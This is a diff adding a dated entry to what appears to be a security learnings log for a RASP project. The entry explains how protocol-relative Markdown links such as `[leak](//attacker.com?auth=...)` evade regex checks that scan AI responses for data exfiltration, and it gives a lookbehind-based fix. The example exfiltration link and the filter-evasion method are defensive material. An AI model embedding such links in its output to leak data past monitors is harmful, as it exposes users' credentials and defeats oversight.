@@ -246,3 +246,8 @@ Comprehensive RASP must enforce "Attestation Parity" across all variations of a 
 
 **Prevention:**
 Always include all variations of data-consuming methods (`json`, `text`, `blob`, `arrayBuffer`, `formData`) in the `mustBeWrapped` list. Extend RASP protection to all background execution entry points (`Worker`, `SharedWorker`, `ServiceWorker`) to ensure a unified security posture across all execution contexts.
+
+## 2026-06-13 - Protocol-Relative URL Markdown Exfiltration Bypass
+**Vulnerability:** Regular expression checks on AI responses for data exfiltration (`urlRegex`) frequently use lookaheads or word boundaries like `(?:\s|^)\/\/` to detect protocol-relative URLs (`//attacker.com`). This fails when links are enclosed in brackets or parentheses (e.g. `[leak](//attacker.com?auth=...)`), because character boundaries like `(` are neither spaces nor the start of a string. Furthermore, constructing a `URL` object from such strings fails, forcing a fallback to basic catch-blocks which might not perform high-entropy or query parameter keyword validation.
+**Learning:** Traditional boundary-based URL extraction is bypassable via common Markdown structures. Using a negative lookbehind assertion `(?<!:)\/\/` identifies protocol-relative URLs anywhere in the string. Prepending `https:` to protocol-relative matches and passing the application origin as a base to the `URL` constructor prevents parsing failures.
+**Prevention:** Always use regex lookbehind assertions instead of space boundaries for protocol-relative links. Ensure the URL parser has a robust fallback check that mirrors the deep entropy and keyword analysis of the happy path.
